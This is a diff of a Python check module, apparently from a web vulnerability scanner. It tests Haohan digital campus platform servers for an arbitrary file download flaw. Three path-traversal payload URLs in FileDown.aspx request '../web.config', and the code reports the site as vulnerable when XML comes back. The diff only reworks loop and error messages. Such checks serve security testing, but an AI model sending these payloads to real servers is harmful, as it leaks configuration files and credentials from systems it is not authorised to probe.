@@ -22,15 +22,19 @@ class haohan_FileDown_filedownload_BaseVerify:
         payloads = ["/IneduPortal/Components/news/FileDown.aspx?OldName=web.config&NewName=../web.config",
                     "/Inedu3In1/Components/news/FileDown.aspx?OldName=web.config&NewName=../../../web.config",
                     "/IneduBlog/Components/news/FileDown.aspx?OldName=web.config&NewName=../../../web.config"]
-        for payload in payloads:
-            try:
+        try:
+            noexist = True
+            for payload in payloads:
                 vulnurl = self.url + payload
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                 if req.headers["Content-Type"] == "application/xml":
                     cprint("[+]存在皓翰数字化校园平台任意文件下载漏洞...(高危)\tpayload: "+vulnurl, "red")
+                    noexist = False
+            if noexist:
+                cprint("[-]不存在haohan_FileDown_filedownload漏洞", "white", "on_grey")
 
-            except:
-                cprint("[-] "+__file__+"====>连接超时", "cyan")
+        except:
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
